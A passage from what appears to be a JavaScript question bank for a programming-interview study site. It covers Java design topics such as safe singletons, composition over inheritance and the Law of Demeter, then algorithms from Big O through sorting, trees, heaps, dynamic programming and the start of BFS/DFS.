// no happens-before!) and happily uses an object whose fields
// are still default values (null/0). Rare, non-reproducible, brutal.</pre>
<pre>// Fix 1: volatile — forbids the reorder, creates happens-before
private static volatile Singleton instance;

// Fix 2 (better): initialization-on-demand holder — lazy, fast, no locks
class Singleton {
    private static class Holder {
        static final Singleton INSTANCE = new Singleton();
    }
    static Singleton getInstance() { return Holder.INSTANCE; }
    // JVM class-loading guarantees safe, lazy, once-only init
}

// Fix 3 (Effective Java): enum singleton
enum Singleton {
    INSTANCE;
    void doWork() { ... }
    // serialization-safe and reflection-safe for free
}</pre>
<p><strong>Why interviewers love it:</strong> it tests whether you understand the Java Memory Model — that <code>null</code>-checks without synchronization give no visibility guarantees, and that object publication is a memory-ordering problem, not a logic problem.</p>
<div class="key-point">Without <code>volatile</code>, instruction reordering can publish the reference before the constructor finishes — another thread sees a non-null, half-built object. Prefer the holder idiom or an enum over hand-rolled double-checked locking.</div>`,
      },
      {
        q: 'Why favor composition over inheritance?',
        difficulty: 'hard',
        a: `<p>Inheritance couples your class to the <strong>implementation details</strong> of the parent — the "fragile base class" problem. The canonical demonstration is <code>InstrumentedHashSet</code> from <em>Effective Java</em>:</p>
<pre>// BROKEN: inheritance leaks the parent's self-calls
class InstrumentedHashSet&lt;E&gt; extends HashSet&lt;E&gt; {
    private int addCount = 0;

    @Override public boolean add(E e) {
        addCount++;
        return super.add(e);
    }
    @Override public boolean addAll(Collection&lt;? extends E&gt; c) {
        addCount += c.size();
        return super.addAll(c);   // ← HashSet.addAll calls add()
    }                             //   internally... OUR add()!
}

InstrumentedHashSet&lt;String&gt; s = new InstrumentedHashSet&lt;&gt;();
s.addAll(List.of("a", "b", "c"));
s.getAddCount();  // 6, not 3! Counted once in addAll, once per add()

// Worse: this depends on an UNDOCUMENTED detail of HashSet.
// If a JDK update changes addAll to not call add(), the count
// silently becomes 3. Your correctness depends on code you
// don't own and can't see.</pre>
<pre>// FIX: composition + delegation (wrapper / decorator style)
class InstrumentedSet&lt;E&gt; implements Set&lt;E&gt; {
    private final Set&lt;E&gt; inner;      // HAS-A, not IS-A
    private int addCount = 0;

    InstrumentedSet(Set&lt;E&gt; inner) { this.inner = inner; }

    public boolean add(E e) { addCount++; return inner.add(e); }
    public boolean addAll(Collection&lt;? extends E&gt; c) {
        addCount += c.size();
        return inner.addAll(c);  // inner's self-calls stay inside
    }                            // inner — can't re-enter our code
    // ...delegate the rest
}
// Bonus: works with ANY Set (HashSet, TreeSet, ...), not just one parent</pre>
<p><strong>The deeper reasons:</strong></p>
<ul>
<li>Inheritance is decided at compile time and you get exactly one parent; composition can be swapped at runtime and combined freely.</li>
<li>Subclassing breaks encapsulation: overriding requires knowing the parent's internal call graph.</li>
<li>Inheritance means the subclass must honor the parent's full contract (LSP) — often you only wanted to reuse some code.</li>
</ul>
<p><strong>When inheritance IS right:</strong> a genuine is-a relationship where the base class is <em>designed and documented for extension</em> (or abstract with template methods). Otherwise, per Effective Java: "design and document for inheritance or else prohibit it."</p>
<div class="key-point">Inheritance couples you to the parent's hidden self-call patterns — a JDK update can break your subclass. Composition forwards calls across a hard boundary, so you depend only on the public contract.</div>`,
      },
      {
        q: 'What is the Anemic Domain Model anti-pattern?',
        difficulty: 'hard',
        a: `<p>An <strong>Anemic Domain Model</strong> (named by Martin Fowler) is when your "domain objects" are just getter/setter bags with zero behavior, and ALL business logic lives in service classes. It looks object-oriented but is procedural code wearing an OO costume.</p>
<pre>// ANEMIC: the entity knows nothing, the service knows everything
class Order {                       // just a data bag
    private String status;
    private List&lt;OrderLine&gt; lines;
    // getters and setters... that's it
}

class OrderService {
    void cancel(Order order) {
        // business rules scattered in the service layer:
        if (order.getStatus().equals("SHIPPED"))
            throw new IllegalStateException("too late");
        order.setStatus("CANCELLED");     // anyone can also just
    }                                     // call setStatus("X")!
}
// Problem: NOTHING stops other code from doing
// order.setStatus("CANCELLED") on a shipped order.
// The invariant lives in one service method, hopefully.</pre>
<pre>// RICH domain model: the entity protects its own invariants
class Order {
    private OrderStatus status;
    private final List&lt;OrderLine&gt; lines = new ArrayList&lt;&gt;();

    public void cancel() {
        if (status == OrderStatus.SHIPPED)
            throw new OrderAlreadyShippedException(id);
        this.status = OrderStatus.CANCELLED;
        registerEvent(new OrderCancelled(id));
    }
    public Money total() {
        return lines.stream().map(OrderLine::subtotal)
                    .reduce(Money.ZERO, Money::add);
    }
    // NO setStatus()! Invalid states are unrepresentable.
}
// The service shrinks to orchestration:
//   load → order.cancel() → save → publish events</pre>
<p><strong>Why it matters:</strong> with anemic models, invariants are enforced "by convention" across many services — each new code path is a chance to corrupt state. A rich model makes the compiler enforce them: there is simply no public mutator that allows an illegal transition.</p>
<p><strong>Why it's debated (say this in the interview):</strong></p>
<ul>
<li>For <strong>simple CRUD</strong> apps, anemic + services is honest and fine — don't force ceremony onto forms-over-data.</li>
<li>Logic spanning many aggregates genuinely belongs in domain services.</li>
<li>Some ORMs and serializers push you toward no-arg constructors and setters; rich models take deliberate effort.</li>
</ul>
<div class="key-point">Anemic models scatter invariants across services where any caller can bypass them; rich models make illegal states unrepresentable — but judge by complexity: rich domain for complex business rules, plain CRUD for plain CRUD.</div>`,
      },
      {
        q: 'When should you NOT use a design pattern?',
        difficulty: 'tricky',
        a: `<p>A favorite senior filter-question. The wrong answer is a blank stare; the right answer is that <strong>patterns are vocabulary, not goals</strong> — each one buys flexibility by adding indirection, and indirection has a permanent readability cost.</p>
<pre>// Resume-driven design: a Strategy/Factory layer-cake...
interface DiscountStrategy { BigDecimal apply(BigDecimal price); }
class RegularDiscountStrategy implements DiscountStrategy { ... }
class PremiumDiscountStrategy implements DiscountStrategy { ... }
class DiscountStrategyFactory {
    static DiscountStrategy create(CustomerType type) { ... }
}
class DiscountContext {
    private DiscountStrategy strategy;  // 4 files, 2 indirections
    ...
}

// ...for logic that was, and will remain, this:
BigDecimal discount(CustomerType type, BigDecimal price) {
    switch (type) {
        case PREMIUM: return price.multiply(new BigDecimal("0.10"));
        case REGULAR: return price.multiply(new BigDecimal("0.05"));
        default:      return BigDecimal.ZERO;
    }
}
// Two stable cases. The switch is readable in 5 seconds.
// The pattern version makes readers chase 4 files to learn
// the same thing — and both versions change the same amount
// of code when a rule changes.</pre>
<p><strong>Don't reach for a pattern when:</strong></p>
<ul>
<li><strong>The axis of change is speculative</strong> — YAGNI. Flexibility for changes that never come is pure cost. Refactor <em>to</em> a pattern when the third variant actually arrives ("Rule of Three").</li>
<li><strong>The pattern is bigger than the problem</strong> — an if/else beats a Strategy for 2 stable branches; a constructor with named parameters beats a Builder for 3 fields.</li>
<li><strong>The language already solved it</strong> — Strategy is just a lambda/function parameter in Java 8+/TypeScript; Observer is built into every event system; Singleton is a DI-container scope.</li>
<li><strong>You're pattern-matching the name, not the forces</strong> — patterns are solutions to specific tensions; applying one without the tension is cargo culting.</li>
</ul>
<p><strong>How to frame it:</strong> patterns emerged as <em>descriptions</em> of good solutions, not prescriptions. Their biggest everyday value is communication — saying "this is a decorator" compresses a design conversation. Interviewers often follow up with: "show me a pattern you removed." Have a story.</p>
<div class="key-point">Every pattern trades readability for flexibility along one axis of change — if that axis never changes, you paid the cost for nothing. Write the simple thing; refactor to the pattern when the second or third real variant shows up.</div>`,
      },
      {
        q: 'What is a God Object, and what does the Law of Demeter say about train wrecks?',
        difficulty: 'hard',
        a: `<p>Two related coupling smells that interviewers probe together.</p>
<p><strong>God Object</strong>: one class that knows too much and does too much — <code>AppManager</code>, <code>Utils</code>, a 4000-line <code>OrderService</code> touching pricing, inventory, email, and PDF generation. Every change routes through it, so it has maximal merge conflicts, untestable constructor dependencies, and no single reason to change (violates SRP by definition).</p>
<p><strong>Law of Demeter</strong> ("only talk to your immediate friends"): a method should call methods on its own fields, its parameters, and objects it creates — not on objects <em>returned by</em> those objects. Violations look like train wrecks:</p>
<pre>// Train wreck — coupled to the STRUCTURE of three objects:
if (customer.getWallet().getPrimaryCard().getExpiry()
            .isBefore(LocalDate.now())) {
    // ...
}
// This code breaks if: Wallet is renamed, a customer can have
// no wallet (NPE!), cards move to a payment service, expiry
// becomes a range... You've hard-coded a path through the
// object graph: customer → wallet → card → expiry.

// Tell, don't ask — push the question to where the data lives:
if (customer.hasExpiredPaymentMethod()) { ... }

class Customer {
    boolean hasExpiredPaymentMethod() {
        return wallet != null && wallet.hasExpiredCard();
    }
}
class Wallet {
    boolean hasExpiredCard() {
        return primaryCard != null && primaryCard.isExpired();
    }
}
// Each class asks only its DIRECT neighbor one question.
// Restructure the graph → only one class changes.</pre>
<p><strong>Why the two smells feed each other:</strong> a God Object is usually built <em>from</em> train wrecks — since it reaches through everyone's internals, all logic gravitates into it. Applying tell-don't-ask redistributes behavior to the objects that own the data, which is exactly how you dismantle a God Object: identify field clusters used by disjoint method groups, extract them, and <em>move the behavior with the data</em>.</p>
<p><strong>Nuance to volunteer:</strong> Demeter applies to <em>objects with behavior</em>, not plain data. Chaining through a DTO, a fluent builder, or a Stream pipeline (<code>list.stream().filter().map()</code>) is fine — those return new values, they don't expose a neighbor's internal structure.</p>
<div class="key-point">Train wrecks couple you to the shape of the whole object graph; tell-don't-ask moves behavior next to its data — the same move that breaks up God Objects. But don't cargo-cult it: fluent APIs and DTO chains are not Demeter violations.</div>`,
      },
    ],
  },

  // ========================= ALGORITHMS & DATA STRUCTURES =========================,
  {
    id: 'algorithms',
    name: 'Algorithms',
    icon: '🧮',
    questions: [
      {
        q: 'What is Big O Notation and why does it matter?',
        difficulty: 'easy',
        a: `<p><strong>Big O Notation</strong> describes how the runtime or memory of an algorithm grows as the input size grows. It answers: <em>"If I double my data, how much slower does it get?"</em></p>
<p><strong>Analogy:</strong> You're looking for a friend in a crowd.</p>
<ul>
<li><strong>O(1)</strong>: Your friend is always at the front door. Crowd size doesn't matter → <strong>constant</strong>.</li>
<li><strong>O(log n)</strong>: You split the crowd in half each time (like binary search) → <strong>logarithmic</strong>.</li>
<li><strong>O(n)</strong>: You check every person one by one → <strong>linear</strong>.</li>
<li><strong>O(n log n)</strong>: Like sorting a deck of cards efficiently (merge sort) → <strong>linearithmic</strong>.</li>
<li><strong>O(n²)</strong>: You compare every person with every other person → <strong>quadratic</strong>.</li>
</ul>
<pre>Speed ranking (best to worst):
  O(1) → O(log n) → O(n) → O(n log n) → O(n²) → O(2ⁿ) → O(n!)

Example with n = 1,000,000:
  O(1)      → 1 operation
  O(log n)  → ~20 operations
  O(n)      → 1,000,000 operations
  O(n²)     → 1,000,000,000,000 operations (too slow!)</pre>
<div class="key-point">In interviews, always state the Big O of your solution. If it's O(n²), ask yourself: "Can I do better?" — usually you can with the right data structure.</div>`,
      },
      {
        q: 'What is an Array vs a Linked List? When to use which?',
        difficulty: 'easy',
        a: `<p><strong>Array</strong>: Elements stored in <strong>contiguous</strong> (side-by-side) memory. Access by index is instant.</p>
<p><strong>Linked List</strong>: Elements (nodes) stored anywhere in memory, each pointing to the next one.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>Array</strong> = Movie theater seats in a row. Seat #5 is easy to find (just count). But inserting a new seat in the middle means moving everyone over.</li>
<li><strong>Linked List</strong> = Scavenger hunt. Each clue tells you where the next clue is. Easy to add/remove clues anywhere, but finding clue #5 means following all previous clues.</li>
</ul>
<pre>Array:      [10][20][30][40][50]   (contiguous in memory)
             0   1   2   3   4    (instant access by index)

Linked List: [10]→[20]→[30]→[40]→[50]→null
             (must walk from head to find element)</pre>
<table><tr><th>Operation</th><th>Array</th><th>Linked List</th></tr>
<tr><td>Access by index</td><td>O(1) ✅</td><td>O(n) ❌</td></tr>
<tr><td>Insert at beginning</td><td>O(n) ❌</td><td>O(1) ✅</td></tr>
<tr><td>Insert at end</td><td>O(1) amortized</td><td>O(1) with tail ptr</td></tr>
<tr><td>Delete from middle</td><td>O(n)</td><td>O(1) if you have the node</td></tr>
<tr><td>Memory</td><td>Compact</td><td>Extra space for pointers</td></tr></table>
<div class="key-point">Use <strong>Array</strong> when you need fast random access (arr[i]). Use <strong>Linked List</strong> when you frequently insert/delete at the beginning or middle.</div>`,
      },
      {
        q: 'What is a Stack and a Queue?',
        difficulty: 'easy',
        a: `<p><strong>Stack</strong> = Last In, First Out (LIFO). Like a stack of plates — you add and remove from the top.</p>
<p><strong>Queue</strong> = First In, First Out (FIFO). Like a line at a coffee shop — first person in line is served first.</p>
<pre>Stack (LIFO):             Queue (FIFO):
  push(1) → [1]            enqueue(1) → [1]
  push(2) → [1,2]          enqueue(2) → [1,2]
  push(3) → [1,2,3]        enqueue(3) → [1,2,3]
  pop()   → 3  [1,2]       dequeue()  → 1  [2,3]
  pop()   → 2  [1]         dequeue()  → 2  [3]</pre>
<p><strong>Real-world uses:</strong></p>
<ul>
<li><strong>Stack</strong>: Browser back button (go back to the last page), Undo/Redo, function call stack, balanced parentheses check.</li>
<li><strong>Queue</strong>: Print queue (first document sent prints first), BFS traversal, task scheduling, message queues.</li>
</ul>
<pre>// Stack example: Check balanced parentheses
Input: "({[]})"
  '(' → push → ['(']
  '{' → push → ['(', '{']
  '[' → push → ['(', '{', '[']
  ']' → pop '[' matches → ['(', '{']
  '}' → pop '{' matches → ['(']
  ')' → pop '(' matches → []
  Stack empty → BALANCED ✅</pre>
<div class="key-point">Both Stack and Queue have <strong>O(1)</strong> push/pop and enqueue/dequeue. In Java: use <code>Deque</code> (ArrayDeque) for stack, <code>Queue</code> (LinkedList) for queue.</div>`,
      },
      {
        q: 'What is a Hash Map (Hash Table) and how does it work?',
        difficulty: 'easy',
        a: `<p>A <strong>Hash Map</strong> stores key-value pairs and provides <strong>O(1)</strong> average lookup, insert, and delete.</p>
<p><strong>Analogy:</strong> A library filing system. Each book (value) has a unique call number (key). The librarian uses a formula (hash function) to calculate exactly which shelf to go to — no need to search every shelf.</p>
<pre>How it works:
1. hash("apple") → 3    (hash function converts key to array index)
2. Store at index 3: buckets[3] = { "apple": 5 }
3. Lookup: hash("apple") → 3 → buckets[3] → value is 5  ✅

Buckets array:
  [0] → null
  [1] → null
  [2] → {"banana": 2}
  [3] → {"apple": 5} → {"grape": 7}  ← collision! (linked list)
  [4] → null</pre>
<p><strong>Collision handling:</strong> When two keys hash to the same index:</p>
<ul>
<li><strong>Chaining</strong>: Each bucket holds a linked list of entries (most common).</li>
<li><strong>Open Addressing</strong>: Find the next empty slot (linear probing).</li>
</ul>
<pre>// Java example:
Map&lt;String, Integer&gt; prices = new HashMap&lt;&gt;();
prices.put("apple", 5);    // O(1)
prices.get("apple");        // O(1) → 5
prices.containsKey("apple"); // O(1) → true</pre>
<div class="key-point">Hash Map is the <strong>#1 most useful data structure</strong> in interviews. It solves "find duplicates", "count frequency", "two sum", and many more in O(n) instead of O(n²).</div>`,
      },
      {
        q: 'What is Binary Search and when can you use it?',
        difficulty: 'easy',
        a: `<p><strong>Binary Search</strong> finds a target in a <strong>sorted</strong> array by repeatedly cutting the search space in half. It's O(log n) — extremely fast.</p>
<p><strong>Analogy:</strong> Guessing a number between 1-100. Instead of guessing 1, 2, 3... you say "50?" → "Too high" → "25?" → "Too low" → "37?" Each guess eliminates half the numbers.</p>
<pre>Find 23 in [2, 5, 8, 12, 16, 23, 38, 56, 72, 91]:

Step 1: mid = 16, 23 > 16 → search right half
Step 2: mid = 38, 23 < 38 → search left half  
Step 3: mid = 23 → FOUND! ✅  (only 3 steps instead of 6)

In 1 billion items: only ~30 steps!</pre>
<pre>// Java implementation:
int binarySearch(int[] arr, int target) {
    int left = 0, right = arr.length - 1;
    while (left <= right) {
        int mid = left + (right - left) / 2;  // avoid overflow
        if (arr[mid] == target) return mid;
        else if (arr[mid] < target) left = mid + 1;
        else right = mid - 1;
    }
    return -1;  // not found
}</pre>
<p><strong>Can use binary search when:</strong></p>
<ul>
<li>Data is <strong>sorted</strong> (or has a monotonic property)</li>
<li>You can eliminate half the search space each step</li>
</ul>
<div class="key-point">Common trick: Binary search isn't just for sorted arrays. It works on any problem where you can answer "too high or too low?" — like finding minimum speed to finish on time, or the first bad version in a release.</div>`,
      },
      {
        q: 'Explain Bubble Sort, Selection Sort, and Insertion Sort.',
        difficulty: 'easy',
        a: `<p>These are three simple sorting algorithms, all O(n²). Great for learning but too slow for large data.</p>
<p><strong>1. Bubble Sort</strong> — Repeatedly swap adjacent elements if they're in the wrong order. Like bubbles rising to the surface.</p>
<pre>[5, 3, 8, 1] → compare pairs and swap:
  5,3 → swap → [3, 5, 8, 1]
  5,8 → ok   → [3, 5, 8, 1]
  8,1 → swap → [3, 5, 1, 8]  (8 "bubbled" to the end)
  ...repeat until sorted</pre>
<p><strong>2. Selection Sort</strong> — Find the minimum element and put it at the front. Like selecting the shortest person in a line and moving them to the left.</p>
<pre>[5, 3, 8, 1] → find min (1), swap with first:
  [1, 3, 8, 5] → find min in remaining (3), already in place:
  [1, 3, 8, 5] → find min in remaining (5), swap with 8:
  [1, 3, 5, 8] ✅</pre>
<p><strong>3. Insertion Sort</strong> — Build the sorted portion one element at a time. Like sorting a hand of playing cards — pick up each card and insert it in the right position.</p>
<pre>[5, 3, 8, 1]:
  [5] | 3, 8, 1  → insert 3 → [3, 5]
  [3, 5] | 8, 1  → insert 8 → [3, 5, 8]
  [3, 5, 8] | 1  → insert 1 → [1, 3, 5, 8] ✅</pre>
<table><tr><th>Algorithm</th><th>Best</th><th>Average</th><th>Worst</th><th>Stable?</th></tr>
<tr><td>Bubble</td><td>O(n)</td><td>O(n²)</td><td>O(n²)</td><td>Yes</td></tr>
<tr><td>Selection</td><td>O(n²)</td><td>O(n²)</td><td>O(n²)</td><td>No</td></tr>
<tr><td>Insertion</td><td>O(n)</td><td>O(n²)</td><td>O(n²)</td><td>Yes</td></tr></table>
<div class="key-point"><strong>Insertion Sort</strong> is the best of the three — it's fast on nearly-sorted data (O(n)) and is used as a subroutine in Timsort (Python/Java's default sort).</div>`,
      },
      {
        q: 'Explain Merge Sort. How does it work?',
        difficulty: 'medium',
        a: `<p><strong>Merge Sort</strong> uses <strong>Divide and Conquer</strong>: split the array in half, sort each half, then merge the two sorted halves. Always O(n log n).</p>
<p><strong>Analogy:</strong> Sorting a deck of cards. Split the deck in half. Split each half again. Keep splitting until you have single cards (already sorted). Then merge pairs of sorted piles by comparing their top cards.</p>
<pre>Merge Sort [38, 27, 43, 3, 9, 82, 10]:

Split:  [38, 27, 43, 3]  |  [9, 82, 10]
Split:  [38, 27] [43, 3] | [9, 82] [10]
Split:  [38][27] [43][3] | [9][82] [10]

Merge:  [27,38] [3,43]   | [9,82] [10]
Merge:  [3, 27, 38, 43]  | [9, 10, 82]
Merge:  [3, 9, 10, 27, 38, 43, 82] ✅</pre>
<p><strong>How merging works:</strong></p>
<pre>Merge [3, 27] and [9, 10]:
  Compare 3 vs 9 → take 3  → [3]
  Compare 27 vs 9 → take 9  → [3, 9]
  Compare 27 vs 10 → take 10 → [3, 9, 10]
  Take remaining 27 → [3, 9, 10, 27] ✅</pre>
<pre>// Java implementation:
void mergeSort(int[] arr, int left, int right) {
    if (left >= right) return;
    int mid = (left + right) / 2;
    mergeSort(arr, left, mid);      // sort left half
    mergeSort(arr, mid + 1, right); // sort right half
    merge(arr, left, mid, right);   // merge sorted halves
}</pre>
<table><tr><th>Property</th><th>Value</th></tr>
<tr><td>Time</td><td>O(n log n) always</td></tr>
<tr><td>Space</td><td>O(n) extra (for temp arrays)</td></tr>
<tr><td>Stable</td><td>Yes</td></tr></table>
<div class="key-point">Merge Sort is <strong>guaranteed O(n log n)</strong> (no worst case like Quick Sort). Used for sorting linked lists and external sorting (data that doesn't fit in memory).</div>`,
      },
      {
        q: 'Explain Quick Sort. How does it work?',
        difficulty: 'medium',
        a: `<p><strong>Quick Sort</strong> picks a "pivot" element, partitions the array so everything smaller goes left and everything larger goes right, then recursively sorts left and right.</p>
<p><strong>Analogy:</strong> Organizing books on a shelf. Pick one book (pivot). Put all shorter books to the left, taller books to the right. Then do the same for each side.</p>
<pre>Quick Sort [8, 3, 1, 7, 0, 10, 2]:
  Pivot = 7
  Partition: [3, 1, 0, 2] [7] [8, 10]
            (all ≤ 7)      ↑   (all > 7)

  Sort left:  Pivot = 1 → [0] [1] [3, 2]
  Sort [3,2]: Pivot = 2 → [2] [3]

  Result: [0, 1, 2, 3, 7, 8, 10] ✅</pre>
<pre>// Java implementation:
void quickSort(int[] arr, int low, int high) {
    if (low >= high) return;
    int pivotIdx = partition(arr, low, high);
    quickSort(arr, low, pivotIdx - 1);
    quickSort(arr, pivotIdx + 1, high);
}

int partition(int[] arr, int low, int high) {
    int pivot = arr[high];  // pick last element as pivot
    int i = low - 1;
    for (int j = low; j < high; j++) {
        if (arr[j] <= pivot) {
            i++;
            swap(arr, i, j);
        }
    }
    swap(arr, i + 1, high);
    return i + 1;
}</pre>
<table><tr><th>Property</th><th>Value</th></tr>
<tr><td>Best/Average</td><td>O(n log n)</td></tr>
<tr><td>Worst case</td><td>O(n²) — when pivot is always min/max</td></tr>
<tr><td>Space</td><td>O(log n) — in-place</td></tr>
<tr><td>Stable</td><td>No</td></tr></table>
<div class="key-point">Quick Sort is <strong>faster in practice</strong> than Merge Sort due to cache locality (in-place). Fix worst case by choosing a <strong>random pivot</strong> or <strong>median-of-three</strong>.</div>`,
      },
      {
        q: 'What is a Binary Tree and a Binary Search Tree (BST)?',
        difficulty: 'easy',
        a: `<p><strong>Binary Tree</strong>: Each node has at most 2 children (left and right).</p>
<p><strong>Binary Search Tree (BST)</strong>: A binary tree where left child < parent < right child. This ordering makes searching fast.</p>
<p><strong>Analogy:</strong> A BST is like a "20 Questions" game. "Is the number > 50?" → No → "Is it > 25?" → Yes → "Is it > 37?" Each question eliminates half the possibilities.</p>
<pre>BST Example:
           8
         /   \\
        3     10
       / \\      \\
      1   6     14
         / \\   /
        4   7 13

Search for 7:
  8 → 7 < 8 → go left
  3 → 7 > 3 → go right
  6 → 7 > 6 → go right
  7 → FOUND! ✅  (4 steps, not all 9 nodes)</pre>
<p><strong>BST operations:</strong></p>
<table><tr><th>Operation</th><th>Average</th><th>Worst (unbalanced)</th></tr>
<tr><td>Search</td><td>O(log n)</td><td>O(n)</td></tr>
<tr><td>Insert</td><td>O(log n)</td><td>O(n)</td></tr>
<tr><td>Delete</td><td>O(log n)</td><td>O(n)</td></tr></table>
<pre>// Java: Insert into BST
TreeNode insert(TreeNode root, int val) {
    if (root == null) return new TreeNode(val);
    if (val < root.val) root.left = insert(root.left, val);
    else root.right = insert(root.right, val);
    return root;
}</pre>
<div class="key-point">A BST becomes O(n) when it's unbalanced (like a linked list). That's why we use <strong>self-balancing BSTs</strong> like AVL Tree or Red-Black Tree (used in Java TreeMap).</div>`,
      },
      {
        q: 'What are tree traversals: Inorder, Preorder, Postorder, and Level-order?',
        difficulty: 'medium',
        a: `<p>Tree traversals are ways to visit every node in a tree. The order you visit determines the traversal type.</p>
<pre>Example tree:
        1
       / \\
      2   3
     / \\
    4   5</pre>
<p><strong>1. Inorder (Left → Root → Right):</strong> Visit left subtree, then root, then right.</p>
<pre>Result: [4, 2, 5, 1, 3]
Use: BST inorder gives nodes in SORTED order!</pre>
<p><strong>2. Preorder (Root → Left → Right):</strong> Visit root first, then left, then right.</p>
<pre>Result: [1, 2, 4, 5, 3]
Use: Copying/serializing a tree.</pre>
<p><strong>3. Postorder (Left → Right → Root):</strong> Visit children first, then root.</p>
<pre>Result: [4, 5, 2, 3, 1]
Use: Deleting a tree (delete children before parent), calculating folder sizes.</pre>
<p><strong>4. Level-order (BFS):</strong> Visit level by level, left to right.</p>
<pre>Result: [1, 2, 3, 4, 5]
Use: Finding shortest path, printing tree by levels.</pre>
<pre>// Java: Inorder traversal
void inorder(TreeNode node) {
    if (node == null) return;
    inorder(node.left);           // L
    System.out.print(node.val);   // Root
    inorder(node.right);          // R
}

// Level-order (BFS) with queue:
void levelOrder(TreeNode root) {
    Queue&lt;TreeNode&gt; q = new LinkedList&lt;&gt;();
    q.add(root);
    while (!q.isEmpty()) {
        TreeNode node = q.poll();
        System.out.print(node.val);
        if (node.left != null) q.add(node.left);
        if (node.right != null) q.add(node.right);
    }
}</pre>
<div class="key-point">Memory trick: <strong>In</strong>order = root <strong>In</strong> the middle. <strong>Pre</strong>order = root comes <strong>first</strong>. <strong>Post</strong>order = root comes <strong>last</strong>.</div>`,
      },
      {
        q: 'What is a Heap (Priority Queue) and how does it work?',
        difficulty: 'medium',
        a: `<p>A <strong>Heap</strong> is a complete binary tree where the parent is always greater (Max-Heap) or smaller (Min-Heap) than its children. It gives you the min/max element in O(1).</p>
<p><strong>Analogy:</strong> A company hierarchy. In a Min-Heap, the CEO (smallest number) is always at the top. New employees (inserts) start at the bottom and "bubble up" if they outrank their manager.</p>
<pre>Min-Heap:
        1
       / \\
      3   5
     / \\
    7   4

- Root is always the MINIMUM (1)
- Not fully sorted! Just parent ≤ children

Operations:
  peek()   → 1          O(1)
  insert(2) → add at bottom, bubble up  O(log n)
  poll()   → remove root (1), move last to root, bubble down  O(log n)</pre>
<pre>// Java: PriorityQueue is a Min-Heap by default
PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;();
minHeap.add(5);  // [5]
minHeap.add(1);  // [1, 5]
minHeap.add(3);  // [1, 5, 3]
minHeap.poll();  // returns 1, heap becomes [3, 5]

// Max-Heap:
PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;(Collections.reverseOrder());</pre>
<p><strong>Common uses:</strong></p>
<ul>
<li><strong>Top K elements</strong>: "Find the 10 largest numbers" → use a Min-Heap of size 10</li>
<li><strong>Merge K sorted lists</strong>: Put heads of all lists in a Min-Heap</li>
<li><strong>Dijkstra's shortest path</strong>: Always process the nearest unvisited node</li>
<li><strong>Task scheduling</strong>: Process highest-priority task first</li>
</ul>
<div class="key-point">A Heap is stored as an <strong>array</strong> under the hood. For node at index i: left child = 2i+1, right child = 2i+2, parent = (i-1)/2.</div>`,
      },
      {
        q: 'What is Recursion? Explain with examples.',
        difficulty: 'easy',
        a: `<p><strong>Recursion</strong> = a function that calls itself to solve smaller versions of the same problem until it reaches a base case.</p>
<p><strong>Analogy:</strong> Russian nesting dolls (Matryoshka). Open a doll → there's a smaller doll inside. Keep opening until you reach the tiniest doll (base case). Then put them all back together.</p>
<pre>// Factorial: 5! = 5 × 4 × 3 × 2 × 1
int factorial(int n) {
    if (n <= 1) return 1;       // base case: stop here!
    return n * factorial(n - 1); // recursive case: call yourself
}

factorial(5)
  = 5 * factorial(4)
  = 5 * 4 * factorial(3)
  = 5 * 4 * 3 * factorial(2)
  = 5 * 4 * 3 * 2 * factorial(1)
  = 5 * 4 * 3 * 2 * 1
  = 120</pre>
<pre>// Fibonacci: 0, 1, 1, 2, 3, 5, 8, 13...
int fib(int n) {
    if (n <= 1) return n;        // base cases: fib(0)=0, fib(1)=1
    return fib(n - 1) + fib(n - 2);
}
// ⚠️ This is O(2ⁿ) — very slow! Use memoization (see DP question)</pre>
<p><strong>Two rules of recursion:</strong></p>
<ol>
<li><strong>Base case</strong>: When to stop (prevents infinite loop)</li>
<li><strong>Recursive case</strong>: Break the problem into a smaller version of itself</li>
</ol>
<div class="key-point">Every recursion can be converted to iteration (using a stack). Watch out for <strong>StackOverflowError</strong> if recursion is too deep. Optimize with <strong>memoization</strong> or <strong>tail recursion</strong>.</div>`,
      },
      {
        q: 'What is Dynamic Programming (DP)?',
        difficulty: 'hard',
        a: `<p><strong>Dynamic Programming</strong> = solving complex problems by breaking them into overlapping subproblems and storing results to avoid recomputing them.</p>
<p><strong>Analogy:</strong> Imagine calculating "1+1+1+1+1+1+1+1". That's 8. Now add "+1". You don't start over! You remember the previous result (8) and just add 1 = 9. That's DP — <strong>remembering answers</strong>.</p>
<p><strong>Two approaches:</strong></p>
<pre>1. Top-Down (Memoization): Start from big problem, store results as you go
2. Bottom-Up (Tabulation): Start from smallest subproblems, build up

// Fibonacci WITHOUT DP → O(2ⁿ) 💀
fib(5) calls fib(4) and fib(3)
fib(4) calls fib(3) and fib(2)   ← fib(3) computed TWICE!

// Fibonacci WITH Memoization → O(n) ✅
int[] memo = new int[n + 1];
int fib(int n) {
    if (n <= 1) return n;
    if (memo[n] != 0) return memo[n];  // already computed!
    memo[n] = fib(n - 1) + fib(n - 2);
    return memo[n];
}

// Fibonacci Bottom-Up → O(n), O(1) space
int fib(int n) {
    int a = 0, b = 1;
    for (int i = 2; i <= n; i++) {
        int temp = a + b;
        a = b;
        b = temp;
    }
    return b;
}</pre>
<p><strong>When to use DP:</strong></p>
<ul>
<li>Problem has <strong>overlapping subproblems</strong> (same calculation repeated)</li>
<li>Problem has <strong>optimal substructure</strong> (optimal solution built from optimal sub-solutions)</li>
<li>Common DP problems: Fibonacci, Longest Common Subsequence, Knapsack, Coin Change</li>
</ul>
<div class="key-point">DP trick: If a recursion tree has repeated branches, it's a DP problem. Draw the recursion tree first, then add memoization.</div>`,
      },
      {
        q: 'Explain BFS (Breadth-First Search) and DFS (Depth-First Search).',
        difficulty: 'medium',
        a: `<p>BFS and DFS are two ways to visit all nodes in a graph or tree.</p>
<p><strong>Analogy — Searching for keys in a house:</strong></p>
<ul>
<li><strong>BFS</strong>: Check every room on floor 1 first, then every room on floor 2, etc. (level by level)</li>
<li><strong>DFS</strong>: Enter a room, if there's a door, go through it immediately. Keep going deeper until you hit a dead end, then backtrack.</li>
</ul>
<pre>Graph:
    1 --- 2
    |     |
    3 --- 4 --- 5

BFS (starting from 1): 1 → 2 → 3 → 4 → 5  (level by level)
DFS (starting from 1): 1 → 2 → 4 → 3 → 5  (go deep first)</pre>
<pre>// BFS uses a QUEUE:
void bfs(int start) {
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
